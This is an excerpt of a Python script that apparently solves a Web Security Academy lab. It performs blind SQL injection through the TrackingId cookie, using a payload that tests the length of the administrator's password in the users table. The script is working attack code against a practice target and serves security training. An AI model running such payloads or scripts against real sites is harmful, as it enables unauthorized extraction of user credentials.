...
def determin_password_length(url):
    for i in range(1, 50):
        print(Fore.WHITE + "1. Checking if password length = " +
              Fore.YELLOW + str(i), flush=True, end='\r')
        try:
            # payload to determine password length
            payload = f"' or length((select password from users where username = 'administrator')) = {i} -- -"
            cookies = {
                "TrackingId": payload
            }
            ...
            if len(welcome_text) != 0:
                print(Fore.WHITE + "1. Checking if password length = " +
                      Fore.YELLOW + str(i) + Fore.WHITE + " [ Correct length: " +
                      Fore.GREEN + str(i) + Fore.WHITE + " ]")
...
url = "https://0a0a0000035c795f80c5354d00e800be.web-security-academy.net"
